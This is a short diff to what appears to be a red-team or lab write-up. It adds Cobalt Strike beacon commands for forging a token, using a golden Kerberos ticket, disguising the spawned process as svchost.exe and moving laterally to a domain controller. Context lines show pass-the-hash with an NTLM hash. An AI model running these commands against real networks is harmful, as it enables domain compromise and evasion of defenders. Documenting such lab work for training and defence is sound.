@@ -43,3 +43,11 @@ and we got SYSTEM on dub-web-1!
 
 beacon> pth DUBLIN\nwallace eb06f0f9e93c9acb12a50fdfeedefc18
 beacon> jump scshell64 dub-dc-1 smb
+
+beacon> make_token CONTOSO\Administrator FakePass
+beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\golden_admin.kirbi
+beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
+beacon> jump scshell64 LON-DC-1 smb
+
+and we got system!
+
